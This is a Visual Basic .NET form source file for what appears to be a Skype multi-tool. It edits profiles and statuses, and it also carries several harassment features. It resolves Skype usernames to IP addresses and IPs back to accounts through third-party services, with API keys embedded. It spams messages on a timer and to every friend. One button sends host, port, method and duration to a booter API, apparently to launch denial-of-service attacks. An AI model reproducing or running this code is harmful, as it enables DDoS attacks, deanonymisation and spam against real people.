Public Class Form1

    Inherits DevComponents.DotNetBar.Metro.MetroForm

    Dim Skype As New SKYPE4COMLib.Skype

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        Try

            Skype.Attach()
            MessageBox.Show("Successfully Connected!", "Connected", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Label3.Text = ("Connected!")
            Label1.Text = ("Welcome," + Skype.CurrentUserProfile.FullName)

        Catch ex As Exception

            MessageBox.Show("Unable to Connect!", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Label3.Text = ("Disconnected!")
            Label1.Text = ("Welcome, Unknown")

        End Try

    End Sub

    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click

        Skype.CurrentUserProfile.MoodText = TextBox1.Text

    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click

        Skype.CurrentUserProfile.FullName = TextBox2.Text
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click

        For Each user As SKYPE4COMLib.User In Skype.Friends

            Skype.SendMessage(user.Handle, TextBox3.Text)

        Next

    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click

        If ComboBox1.SelectedItem = "Online" Then
            Skype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusOnline

        End If
        If ComboBox1.SelectedItem = "Away" Then
            Skype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusAway

        End If
        If ComboBox1.SelectedItem = "DoNotDisturb" Then
            Skype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusDoNotDisturb
        End If
        If ComboBox1.SelectedItem = "Invisible" Then
            Skype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusInvisible
        End If
        If ComboBox1.SelectedItem = "Offline" Then
            Skype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusOffline
        End If

    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click

        PictureBox1.Image = New System.Drawing.Bitmap(New IO.MemoryStream(New System.Net.WebClient().DownloadData("https://api.skype.com/users/" + TextBox4.Text + "/profile/avatar")))

    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click

        If Me.PictureBox1.Image IsNot Nothing Then

            Me.PictureBox1.Image.Save(IO.Path.Combine(My.Computer.FileSystem.SpecialDirectories.Desktop, TextBox4.Text + "avatar.jpg"))
            MessageBox.Show("Image Saved To Desktop!", "Avatar Grabber", MessageBoxButtons.OK, MessageBoxIcon.Information)

        End If

    End Sub

    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click

        Dim webClient As New System.Net.WebClient
        Dim Resolve As String = webClient.DownloadString("https://GoResolver.com/free.php?username=" + TextBox5.Text)

        TextBox6.Text = (Resolve)


    End Sub

    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click


        Dim webClient As New System.Net.WebClient
        Dim IP2Skype As String = webClient.DownloadString("rooting.xyz/ip2skype.php?key=n4vrmorgan.mcneil01XYUq&ip=" + TextBox8.Text)

        TextBox7.Text = (IP2Skype)

    End Sub

    Private Sub Button26_Click(sender As Object, e As EventArgs) Handles Button26.Click

        Dim webClient As New System.Net.WebClient
        Dim IP2Host As String = webClient.DownloadString("http://api.predator.wtf/ip2host/?arguments=" + TextBox29.Text)

        TextBox28.Text = (IP2Host)

    End Sub

    Private Sub Button27_Click(sender As Object, e As EventArgs) Handles Button27.Click

        Dim webClient As New System.Net.WebClient
        Dim Host2IP As String = webClient.DownloadString("http://api.predator.wtf/host2ip/?arguments=" + TextBox31.Text)

        TextBox30.Text = (Host2IP)

    End Sub

    Private Sub Button28_Click(sender As Object, e As EventArgs) Handles Button28.Click

        Dim webClient As New System.Net.WebClient
        Dim GeoIP As String = webClient.DownloadString("" + TextBox32.Text)

        TextBox33.Text = (GeoIP)

    End Sub

    Private Sub Button10_Click(sender As Object, e As EventArgs) Handles Button10.Click

        TextBox9.Text = Skype.CurrentUserProfile.FullName
        TextBox10.Text = Skype.CurrentUserProfile.Birthday
        TextBox11.Text = Skype.CurrentUserProfile.Country
        TextBox12.Text = Skype.CurrentUserProfile.Timezone
        TextBox13.Text = Skype.CurrentUserProfile.PhoneMobile
        TextBox14.Text = Skype.CurrentUserProfile.Sex
        TextBox15.Text = Skype.CurrentUserProfile.City

    End Sub

    Private Sub Button11_Click(sender As Object, e As EventArgs) Handles Button11.Click

        Skype.CurrentUserProfile.FullName = TextBox9.Text

    End Sub

    Private Sub Button12_Click(sender As Object, e As EventArgs) Handles Button12.Click

        Skype.CurrentUserProfile.Birthday = TextBox10.Text

    End Sub

    Private Sub Button13_Click(sender As Object, e As EventArgs) Handles Button13.Click

        Skype.CurrentUserProfile.Country = TextBox11.Text

    End Sub

    Private Sub Button14_Click(sender As Object, e As EventArgs) Handles Button14.Click

        Skype.CurrentUserProfile.Timezone = TextBox12.Text

    End Sub

    Private Sub Button15_Click(sender As Object, e As EventArgs) Handles Button15.Click

        Skype.CurrentUserProfile.PhoneMobile = TextBox13.Text

    End Sub

    Private Sub Button16_Click(sender As Object, e As EventArgs) Handles Button16.Click

        Skype.CurrentUserProfile.Sex = TextBox14.Text

    End Sub

    Private Sub Button17_Click(sender As Object, e As EventArgs) Handles Button17.Click

        Skype.CurrentUserProfile.City = TextBox15.Text

    End Sub

    Private Sub Button18_Click(sender As Object, e As EventArgs) Handles Button18.Click

        Skype.CurrentUserProfile.RichMoodText = "<blink>" + TextBox16.Text + "</blink>"

    End Sub

    Private Sub Button19_Click(sender As Object, e As EventArgs) Handles Button19.Click

        Skype.CurrentUserProfile.RichMoodText = "</spinner>" + TextBox17.Text + "</spinner>"

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick

        Skype.SendMessage(TextBox18.Text, TextBox19.Text)

    End Sub

    Private Sub Button20_Click(sender As Object, e As EventArgs) Handles Button20.Click

        Timer1.Interval = TextBox20.Text
        Timer1.Start()

    End Sub

    Private Sub Button21_Click(sender As Object, e As EventArgs) Handles Button21.Click

        Timer1.Stop()

    End Sub

    Private Sub Button22_Click(sender As Object, e As EventArgs) Handles Button22.Click

        Dim web As New System.Net.WebClient
        web.DownloadString("http://api.mad.sh/api/leg.php?method=" + TextBox23.Text + "&host=" + TextBox21.Text + "&port=" + TextBox22.Text + "&time=" + TextBox24.Text + "&cust=leg&key=3331837721")

    End Sub

    Private Sub Button23_Click(sender As Object, e As EventArgs) Handles Button23.Click

        Timer2.Start()

    End Sub

    Private Sub Button24_Click(sender As Object, e As EventArgs) Handles Button24.Click

        Timer2.Stop()

    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick

        Skype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusOnline
        If Skype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusOnline = True Then
            Skype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusAway
        End If
        If Skype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusAway = True Then
            Skype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusDoNotDisturb
        End If
        If Skype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusDoNotDisturb = True Then
            Skype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusInvisible
        End If

    End Sub

    Private Sub Button25_Click(sender As Object, e As EventArgs) Handles Button25.Click

        Timer2.Interval = TextBox25.Text

    End Sub
End Class
